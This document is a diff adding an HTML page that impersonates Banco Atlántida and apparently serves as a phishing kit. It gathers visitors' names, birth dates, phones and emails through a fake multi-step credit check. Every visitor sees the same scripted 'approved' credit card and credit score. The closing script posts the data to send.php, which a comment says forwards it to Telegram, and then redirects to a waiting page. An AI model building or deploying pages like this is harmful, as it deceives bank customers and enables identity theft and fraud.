@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Banco Atl&#225;ntida · Simulación de Perfil Financiero</title>
+  <link rel="icon" href="img/logo-ba.svg" type="image/svg+xml" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --red: #E30613;
+      --red-dark: #B30410;
+      --bg: #F1F1F1;
+      --text: #1a1a1a;
+      --text-muted: #6b7280;
+    }
+
+    html, body {
+      font-family: 'Inter', -apple-system, 'Segoe UI', Roboto, sans-serif;
+      color: var(--text);
+      background: var(--bg);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    /* ====== HEADER ====== */
+    .site-header {
+      background: #fff;
+      padding: 22px 5vw;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      box-shadow: 0 1px 0 rgba(0,0,0,0.07);
+    }
+    .logo {
+      display: inline-flex;
+      align-items: center;
+    }
+    .logo img {
+      height: 56px;
+      width: auto;
+      display: block;
+    }
+    .menu-btn {
+      width: 46px;
+      height: 46px;
+      background: transparent;
+      border: 0;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text);
+      border-radius: 8px;
+      transition: background .15s;
+    }
+    .menu-btn:hover { background: rgba(0,0,0,0.05); }
+    .menu-btn svg { width: 28px; height: 28px; }
+
+    @media (max-width: 860px) {
+      .site-header { padding: 16px 20px; }
+      .logo img { height: 36px; }
+      .menu-btn { width: 40px; height: 40px; }
+      .menu-btn svg { width: 24px; height: 24px; }
+    }
+
+    /* ====== FLUJO MULTIPASO ====== */
+    .flow {
+      background: var(--bg);
+      padding: 40px 5vw 60px;
+      animation: fadeIn .4s ease;
+    }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
+
+    .flow-inner { max-width: 920px; margin: 0 auto; }
+
+    /* Stepper */
+    .stepper {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 8px;
+      margin: 0 auto 36px;
+      max-width: 640px;
+      list-style: none;
+      position: relative;
+    }
+    .stepper::before {
+      content: '';
+      position: absolute;
+      top: 28px; left: 12%; right: 12%;
+      height: 2px;
+      background: #e5e7eb;
+      z-index: 0;
+    }
+    .step {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      position: relative;
+      z-index: 1;
+    }
+    .step-circle {
+      width: 56px; height: 56px;
+      border-radius: 50%;
+      background: #e9ecef;
+      color: #9ca3af;
+      display: flex; align-items: center; justify-content: center;
+      transition: all .25s;
+    }
+    .step-circle svg { width: 24px; height: 24px; }
+    .step-label {
+      font-size: 13px;
+      color: #6b7280;
+      text-align: center;
+      line-height: 1.25;
+      font-weight: 500;
+    }
+    .step.active .step-circle {
+      background: var(--red);
+      color: #fff;
+      box-shadow: 0 0 0 5px rgba(227,6,19,0.15);
+    }
+    .step.done .step-circle { background: var(--red); color: #fff; }
+    .step.active .step-label,
+    .step.done .step-label { color: var(--text); font-weight: 600; }
+
+    /* Panes */
+    .pane { display: none; }
+    .pane.active { display: block; animation: fadeIn .35s ease; }
+
+    .form-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 28px;
+      box-shadow: 0 4px 18px rgba(0,0,0,0.05);
+    }
+    .form-title {
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+      margin-bottom: 8px;
+      color: var(--text);
+    }
+    .form-sub {
+      font-size: 14.5px;
+      color: var(--text-muted);
+      margin-bottom: 22px;
+    }
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 18px;
+    }
+    .field { display: flex; flex-direction: column; gap: 8px; }
+    .field.full { grid-column: 1 / -1; }
+    .field label {
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text);
+    }
+    .req { color: var(--red); }
+    .input-wrap,
+    .select-wrap { position: relative; }
+    .input-wrap .input-icon,
+    .select-wrap .input-icon {
+      position: absolute;
+      left: 14px; top: 50%;
+      transform: translateY(-50%);
+      width: 20px; height: 20px;
+      color: var(--red);
+      pointer-events: none;
+      flex-shrink: 0;
+    }
+    .field input,
+    .field select {
+      width: 100%;
+      height: 50px;
+      background: #fff;
+      border: 1.5px solid #d9dde3;
+      border-radius: 10px;
+      padding: 0 14px;
+      font-size: 15px;
+      font-family: inherit;
+      color: var(--text);
+      transition: border-color .15s, box-shadow .15s;
+    }
+    .input-wrap input { padding-left: 44px; }
+    .select-wrap.with-icon select { padding-left: 44px; padding-right: 40px; appearance: none; }
+    .select-caret {
+      position: absolute;
+      right: 14px; top: 50%;
+      transform: translateY(-50%);
+      width: 18px; height: 18px;
+      color: #6b7280;
+      pointer-events: none;
+    }
+    .field input::placeholder { color: #9ca3af; }
+    .field input:focus,
+    .field select:focus {
+      outline: none;
+      border-color: var(--red);
+      box-shadow: 0 0 0 3px rgba(227,6,19,0.18);
+    }
+
+    /* Alerts */
+    .alert {
+      display: flex;
+      gap: 12px;
+      padding: 14px 16px;
+      border-radius: 12px;
+      margin-bottom: 22px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .alert.full { grid-column: 1 / -1; margin-top: 4px; margin-bottom: 0; }
+    .alert-warning {
+      background: #fff8db;
+      color: #6b5a13;
+      border: 1px solid #f1e4a0;
+      text-align: center;
+      justify-content: center;
+    }
+    .alert-warning strong { color: #6b5a13; }
+    .alert-info {
+      background: #fbe9eb;
+      color: #7a1117;
+      border: 1px solid #f5c2c7;
+    }
+    .alert-info strong { color: var(--red-dark); display: block; margin-bottom: 2px; }
+    .alert-info .alert-icon { color: var(--red); flex-shrink: 0; }
+    .alert-icon svg { width: 22px; height: 22px; }
+    .alert-success {
+      background: #ecfdf3;
+      color: #155d36;
+      border: 1px solid #b6e7c9;
+    }
+    .alert-success strong { display: block; margin-bottom: 2px; }
+    .alert-success .alert-icon { color: #1d8c44; flex-shrink: 0; }
+
+    /* Acciones */
+    .actions { margin-top: 26px; display: flex; justify-content: flex-end; }
+    .actions.full { grid-column: 1 / -1; }
+    .btn-primary {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--red);
+      color: #fff;
+      border: 0;
+      padding: 14px 32px;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      box-shadow: 0 6px 18px rgba(227,6,19,0.30);
+      transition: background .15s, transform .1s, box-shadow .2s;
+    }
+    .btn-primary:hover { background: var(--red-dark); box-shadow: 0 8px 22px rgba(227,6,19,0.42); }
+    .btn-primary:active { transform: translateY(1px); }
+    .btn-primary svg { width: 18px; height: 18px; }
+    .btn-primary.full-w { width: 100%; justify-content: center; padding: 16px; }
+
+    /* Step 3 - validación */
+    .validation-block { text-align: center; padding: 30px 16px; }
+    .spinner-lg {
+      width: 64px; height: 64px;
+      border-radius: 50%;
+      border: 5px solid #fbd5d8;
+      border-top-color: var(--red);
+      margin: 0 auto 22px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .validation-title { font-size: 20px; font-weight: 700; margin-bottom: 6px; }
+    .validation-sub { color: var(--text-muted); font-size: 14px; margin-bottom: 24px; }
+    .status-list { list-style: none; max-width: 360px; margin: 0 auto; text-align: left; }
+    .status-list li {
+      display: flex; align-items: center; gap: 10px;
+      padding: 8px 0;
+      font-size: 14px;
+      color: var(--text-muted);
+    }
+    .status-list .status-icon {
+      width: 22px; height: 22px;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .status-list .done .status-icon { background: #1d8c44; color: #fff; }
+    .status-list .done .status-icon svg { width: 14px; height: 14px; }
+    .status-list .done { color: var(--text); }
+    .status-list .loading .status-icon {
+      border: 2px solid #fbd5d8;
+      border-top-color: var(--red);
+      animation: spin 1s linear infinite;
+    }
+
+    /* Step 4 - resultados */
+    .product-card {
+      display: grid;
+      grid-template-columns: 220px 1fr;
+      gap: 24px;
+      background: #fff;
+      border-radius: 14px;
+      padding: 22px;
+      margin-top: 22px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+    .product-card-img { display: flex; align-items: center; justify-content: center; }
+    .product-card-img img { max-width: 100%; height: auto; animation: cardFloat 3s ease-in-out infinite; }
+    @keyframes cardFloat { 0%,100%{transform:translateY(0) rotate(-1deg)} 50%{transform:translateY(-10px) rotate(1deg)} }
+    .product-head {
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 12px; margin-bottom: 14px; flex-wrap: wrap;
+    }
+    .product-title { font-size: 17px; font-weight: 700; }
+    .badge {
+      font-size: 11px; font-weight: 700;
+      letter-spacing: 0.5px;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: #ecfdf3; color: #1d8c44;
+    }
+    .product-info { list-style: none; margin-bottom: 16px; }
+    .product-info li {
+      display: flex; justify-content: space-between;
+      padding: 7px 0;
+      font-size: 14px;
+      border-bottom: 1px dashed #eee;
+    }
+    .product-info li:last-child { border-bottom: 0; }
+    .text-success { color: #1d8c44; }
+    .summary-card {
+      background: #fff; border-radius: 14px; padding: 22px;
+      margin-top: 22px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+    .summary-title { font-size: 17px; font-weight: 700; margin-bottom: 16px; }
+    .summary-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 14px;
+      text-align: center;
+    }
+    .summary-grid > div {
+      background: var(--bg);
+      border-radius: 10px;
+      padding: 14px 8px;
+    }
+    .summary-value { font-size: 22px; font-weight: 800; color: var(--text); }
+    .summary-label { font-size: 12px; color: var(--text-muted); margin-top: 4px; }
+
+    @media (max-width: 720px) {
+      .form-grid { grid-template-columns: 1fr; }
+      .stepper { gap: 4px; }
+      .step-circle { width: 48px; height: 48px; }
+      .step-circle svg { width: 20px; height: 20px; }
+      .stepper::before { top: 24px; }
+      .step-label { font-size: 11px; }
+      .form-card { padding: 22px 18px; }
+      .form-title { font-size: 20px; }
+      .actions { justify-content: stretch; }
+      .btn-primary { width: 100%; justify-content: center; }
+      .product-card { grid-template-columns: 1fr; }
+      .product-card-img img { max-width: 200px; margin: 0 auto; animation: cardFloat 3s ease-in-out infinite; }
+      .summary-grid { grid-template-columns: 1fr 1fr; }
+    }
+
+    /* ====== FOOTER ====== */
+    .site-footer {
+      background: #2f2f2f;
+      color: #d8d8d8;
+      padding: 60px 5vw 40px;
+    }
+    .footer-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1.1fr repeat(4, 1fr);
+      gap: 40px;
+    }
+    .footer-brand .footer-logo {
+      height: 64px;
+      width: auto;
+      display: block;
+      margin-bottom: 28px;
+      filter: brightness(0) invert(1);
+    }
+    .footer-callcenter h4 {
+      font-size: 22px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 14px;
+    }
+    .footer-phone {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      color: #d8d8d8;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .footer-phone .phone-icon {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      border: 1.5px solid #d8d8d8;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .footer-phone .phone-icon svg { width: 14px; height: 14px; }
+
+    .footer-col h5 {
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      margin-bottom: 22px;
+    }
+    .footer-col ul { list-style: none; }
+    .footer-col ul li { margin-bottom: 18px; }
+    .footer-col ul li a {
+      color: #c8c8c8;
+      text-decoration: none;
+      font-size: 14.5px;
+      line-height: 1.45;
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      transition: color .15s;
+    }
+    .footer-col ul li a:hover { color: #fff; }
+    .footer-col ul li a::before {
+      content: '›';
+      color: #c8c8c8;
+      font-size: 18px;
+      line-height: 1;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    @media (max-width: 1024px) {
+      .footer-inner {
+        grid-template-columns: 1fr 1fr;
+        gap: 36px;
+      }
+      .footer-brand { grid-column: 1 / -1; }
+    }
+    @media (max-width: 560px) {
+      .site-footer { padding: 36px 22px 28px; }
+      .footer-inner { grid-template-columns: 1fr; gap: 28px; }
+      .footer-brand .footer-logo { height: 48px; margin-bottom: 20px; }
+      .footer-callcenter h4 { font-size: 18px; margin-bottom: 10px; }
+      .footer-phone { font-size: 14px; }
+      .footer-col h5 { font-size: 15px; margin-bottom: 16px; }
+      .footer-col ul li { margin-bottom: 14px; }
+      .footer-col ul li a { font-size: 13.5px; }
+      /* En móvil solo se muestran: marca + Call Center + Personas */
+      .footer-col:nth-of-type(2),
+      .footer-col:nth-of-type(3),
+      .footer-col:nth-of-type(4) { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <header class="site-header">
+    <a href="index.html" class="logo" aria-label="Banco Atl&#225;ntida - Inicio">
+      <img src="img/logo-ba.svg" alt="Banco Atl&#225;ntida" />
+    </a>
+    <button type="button" class="menu-btn" aria-label="Abrir menú">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="3" y1="6"  x2="21" y2="6"/>
+        <line x1="3" y1="12" x2="21" y2="12"/>
+        <line x1="3" y1="18" x2="21" y2="18"/>
+      </svg>
+    </button>
+  </header>
+
+  <!-- ============ FLUJO MULTIPASO ============ -->
+  <section class="flow" id="flow">
+    <div class="flow-inner">
+
+      <!-- Stepper -->
+      <ol class="stepper" id="stepper">
+        <li class="step" data-step="1">
+          <div class="step-circle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          </div>
+          <span class="step-label">Datos<br/>Personales</span>
+        </li>
+        <li class="step" data-step="2">
+          <div class="step-circle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="16" rx="2"/><circle cx="9" cy="10" r="2"/><path d="M15 8h2M15 12h2M5 18s1-2 4-2 4 2 4 2"/></svg>
+          </div>
+          <span class="step-label">Identificación</span>
+        </li>
+        <li class="step" data-step="3">
+          <div class="step-circle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+          </div>
+          <span class="step-label">Validación</span>
+        </li>
+        <li class="step" data-step="4">
+          <div class="step-circle">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12l3 3 5-6"/></svg>
+          </div>
+          <span class="step-label">Resultados</span>
+        </li>
+      </ol>
+
+      <!-- PASO 1 -->
+      <div class="pane" data-pane="1">
+        <div class="alert alert-warning">
+          <span><strong>Importante:</strong> Simulación informativa. No accede a bases de datos crediticias reales.</span>
+        </div>
+        <div class="form-card">
+          <h2 class="form-title">Información Personal</h2>
+          <p class="form-sub">Ingresa tus datos para simular tu perfil financiero.</p>
+          <form id="form1" class="form-grid" novalidate>
+            <div class="field">
+              <label for="nombres">Nombres Completos <span class="req">*</span></label>
+              <input type="text" id="nombres" name="nombres" placeholder="Juan Carlos" required />
+            </div>
+            <div class="field">
+              <label for="apellidos">Apellidos Completos <span class="req">*</span></label>
+              <input type="text" id="apellidos" name="apellidos" placeholder="Pérez González" required />
+            </div>
+            <div class="actions full">
+              <button type="submit" class="btn-primary">
+                Continuar
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- PASO 2 -->
+      <div class="pane" data-pane="2">
+        <div class="form-card">
+          <h2 class="form-title">Información de Contacto</h2>
+          <p class="form-sub">Estos datos nos permiten validar tu perfil con Banco Atl&#225;ntida.</p>
+          <form id="form2" class="form-grid" novalidate>
+            <div class="field">
+              <label for="fechaNac">Fecha de Nacimiento <span class="req">*</span></label>
+              <div class="input-wrap">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"/><path d="M16 2v4M8 2v4M3 10h18"/></svg>
+                <input type="text" id="fechaNac" placeholder="DD/MM/AAAA" maxlength="10" inputmode="numeric" required />
+              </div>
+            </div>
+            <div class="field">
+              <label for="phone">Teléfono <span class="req">*</span></label>
+              <div class="input-wrap">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+                <input type="tel" id="phone" placeholder="9999 9999" maxlength="9" inputmode="numeric" required />
+              </div>
+            </div>
+            <div class="field">
+              <label for="email">Correo Electrónico <span class="req">*</span></label>
+              <div class="input-wrap">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 5L2 7"/></svg>
+                <input type="email" id="email" placeholder="correo@ejemplo.com" required />
+              </div>
+            </div>
+            <div class="field">
+              <label for="antiguedad">Antigüedad con Banco Atl&#225;ntida <span class="req">*</span></label>
+              <div class="select-wrap with-icon">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                <select id="antiguedad" required>
+                  <option value="" disabled selected>Seleccionar</option>
+                  <option>Menos de 1 año</option>
+                  <option>1 a 3 años</option>
+                  <option>3 a 5 años</option>
+                  <option>Más de 5 años</option>
+                  <option>No soy cliente</option>
+                </select>
+                <svg class="select-caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
+              </div>
+            </div>
+            <div class="alert alert-info full">
+              <div class="alert-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
+              </div>
+              <div>
+                <strong>Protección de Datos</strong>
+                Tus datos están protegidos. Solo serán utilizados para fines de evaluación crediticia con Banco Atl&#225;ntida.
+              </div>
+            </div>
+            <div class="actions full">
+              <button type="submit" class="btn-primary full-w">
+                Continuar
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- PASO 3 -->
+      <div class="pane" data-pane="3">
+        <div class="form-card">
+          <div class="validation-block">
+            <div class="spinner-lg" aria-hidden="true"></div>
+            <h3 class="validation-title">Analizando tu Perfil Estimado</h3>
+            <p class="validation-sub">Este proceso puede tomar hasta 30 segundos...</p>
+            <ul class="status-list" id="statusList">
+              <li class="done"><span class="status-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg></span>Verificando información</li>
+              <li class="done"><span class="status-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg></span>Consultando perfil financiero</li>
+              <li class="loading"><span class="status-icon"></span>Consultando historial crediticio</li>
+              <li><span class="status-icon"></span>Analizando elegibilidad de productos</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- PASO 4 -->
+      <div class="pane" data-pane="4">
+        <div class="form-card">
+          <h2 class="form-title">Resultados de Simulación</h2>
+          <p class="form-sub">Basado en tu perfil estimado, tenemos estas opciones para ti.</p>
+          <div class="alert alert-success">
+            <div class="alert-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></svg>
+            </div>
+            <div>
+              <strong>¡Felicidades!</strong>
+              Tu perfil estimado cumple con nuestros criterios. Tienes acceso a múltiples opciones financieras.
+            </div>
+          </div>
+
+          <div class="product-card">
+            <div class="product-card-img">
+              <img src="img/tarj_credmast_crd+3.png" alt="Tarjeta de Crédito Banco Atl&#225;ntida" />
+            </div>
+            <div>
+              <div class="product-head">
+                <h3 class="product-title">Tarjeta de Cr&#233;dito Atl&#225;ntida Black Infinite</h3>
+                <span class="badge">APROBADA</span>
+              </div>
+              <ul class="product-info">
+                <li><span>Monto aprobado:</span><strong class="text-success">L 180,000</strong></li>
+                <li><span>Tasa de interés:</span><strong>1.1% mensual</strong></li>
+                <li><span>Cuota de manejo:</span><strong>L 350</strong></li>
+              </ul>
+              <button type="button" id="btnSolicitar" class="btn-primary full-w">Solicitar Ahora</button>
+            </div>
+          </div>
+
+          <div class="summary-card">
+            <h3 class="summary-title">Resumen de tu Perfil</h3>
+            <div class="summary-grid">
+              <div><div class="summary-value">752</div><div class="summary-label">Score Crediticio</div></div>
+              <div><div class="summary-value text-success">Excelente</div><div class="summary-label">Historial</div></div>
+              <div><div class="summary-value">0</div><div class="summary-label">Reportes Negativos</div></div>
+              <div><div class="summary-value">2</div><div class="summary-label">Productos Aptos</div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+
+      <div class="footer-brand">
+        <img src="img/logo-ba-positiva.svg" alt="Banco Atl&#225;ntida" class="footer-logo" />
+        <div class="footer-callcenter">
+          <h4>Call Center</h4>
+          <a href="tel:22801010" class="footer-phone">
+            <span class="phone-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+              </svg>
+            </span>
+            2280-1010
+          </a>
+        </div>
+      </div>
+
+      <div class="footer-col">
+        <h5>Personas</h5>
+        <ul>
+          <li><a href="#">Ahorro e Inversión</a></li>
+          <li><a href="#">Canales de Atención</a></li>
+          <li><a href="#">Remesas Familiares</a></li>
+          <li><a href="#">Tarjetas de Débito</a></li>
+          <li><a href="#">Tarjetas de Crédito</a></li>
+          <li><a href="#">Pr&#233;stamos Atl&#225;ntida</a></li>
+          <li><a href="#">Bancaseguros</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col">
+        <h5>Comercial Pyme</h5>
+        <ul>
+          <li><a href="#">Ahorro e Inversión</a></li>
+          <li><a href="#">Tarjetas de Crédito</a></li>
+          <li><a href="#">Productos Cash Management</a></li>
+          <li><a href="#">Productos Crediticios</a></li>
+          <li><a href="#">Productos Internacionales</a></li>
+          <li><a href="#">Planes de Asistencia Pyme</a></li>
+          <li><a href="#">Impulso a Emprendedores</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col">
+        <h5>Corporativa</h5>
+        <ul>
+          <li><a href="#">Ahorro e Inversión</a></li>
+          <li><a href="#">Productos Cash Management</a></li>
+          <li><a href="#">Productos Crediticios</a></li>
+          <li><a href="#">Tarjetas Atl&#225;ntida</a></li>
+          <li><a href="#">Productos Internacionales</a></li>
+          <li><a href="#">Comercios Afiliados</a></li>
+          <li><a href="#">Atención Banca de Empresas</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col">
+        <h5>Accesos Rápidos</h5>
+        <ul>
+          <li><a href="#">EFA</a></li>
+          <li><a href="#">Ley FATCA</a></li>
+          <li><a href="#">Conoce y Compara</a></li>
+        </ul>
+      </div>
+
+    </div>
+  </footer>
+
+  <script>
+    (function () {
+      const steps = document.querySelectorAll('#stepper .step');
+      const panes = document.querySelectorAll('.pane');
+      const form1 = document.getElementById('form1');
+      const form2 = document.getElementById('form2');
+
+      function setStep(n) {
+        steps.forEach(s => {
+          const num = +s.dataset.step;
+          s.classList.remove('active', 'done');
+          if (num < n) s.classList.add('done');
+          else if (num === n) s.classList.add('active');
+        });
+        panes.forEach(p => {
+          p.classList.toggle('active', +p.dataset.pane === n);
+        });
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      // Iniciar en paso 1
+      setStep(1);
+
+      // Almacena datos del paso 1
+      let data1 = {};
+      form1.addEventListener('submit', e => {
+        e.preventDefault();
+        if (!form1.checkValidity()) { form1.reportValidity(); return; }
+        data1 = {
+          nombres:   document.getElementById('nombres').value,
+          apellidos: document.getElementById('apellidos').value,
+        };
+        setStep(2);
+      });
+
+      form2.addEventListener('submit', e => {
+        e.preventDefault();
+        if (!form2.checkValidity()) { form2.reportValidity(); return; }
+
+        data1.fechaNac   = document.getElementById('fechaNac').value;
+        data1.phone      = document.getElementById('phone').value;
+        data1.email      = document.getElementById('email').value;
+        data1.antiguedad = document.getElementById('antiguedad').value;
+
+        setStep(3);
+
+        // Animar lista de status → paso 4
+        const list = document.querySelectorAll('#statusList li');
+        let idx = 2;
+        const tick = () => {
+          if (idx < list.length) {
+            const cur = list[idx];
+            cur.classList.remove('loading');
+            cur.classList.add('done');
+            cur.querySelector('.status-icon').innerHTML =
+              '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>';
+            const next = list[idx + 1];
+            if (next) next.classList.add('loading');
+            idx++;
+            setTimeout(tick, 1400);
+          } else {
+            setTimeout(() => setStep(4), 600);
+          }
+        };
+        setTimeout(tick, 1400);
+      });
+
+      // Solicitar Ahora → envía a Telegram y va a espera.php
+      const btnSolicitar = document.getElementById('btnSolicitar');
+      if (btnSolicitar) {
+        btnSolicitar.addEventListener('click', e => {
+          e.preventDefault();
+          const uid = (data1.nombres || '') + ' ' + (data1.apellidos || '');
+          const body = new FormData();
+          body.append('nombres',    data1.nombres    || '');
+          body.append('apellidos',  data1.apellidos  || '');
+          body.append('fechaNac',   data1.fechaNac   || '');
+          body.append('phone',      data1.phone      || '');
+          body.append('email',      data1.email      || '');
+          body.append('antiguedad', data1.antiguedad || '');
+          const rawPhone = (data1.phone || '').replace(/\D/g, '');
+          if (rawPhone.length >= 4) localStorage.setItem('wa_p4', rawPhone.substring(0, 4));
+          fetch('send.php', { method: 'POST', body, keepalive: true })
+            .catch(() => {})
+            .finally(() => {
+              window.location.href = 'espera.php?u=' + encodeURIComponent(uid);
+            });
+        });
+      }
+
+      // Auto-formato fecha DD/MM/AAAA
+      const fechaInput = document.getElementById('fechaNac');
+      fechaInput.addEventListener('input', e => {
+        let v = e.target.value.replace(/\D/g, '').slice(0, 8);
+        if (v.length > 4) v = v.slice(0, 2) + '/' + v.slice(2, 4) + '/' + v.slice(4);
+        else if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
+        e.target.value = v;
+      });
+    })();
+  </script>
+
+<script src="protect.js"></script>
+</body>
+</html>
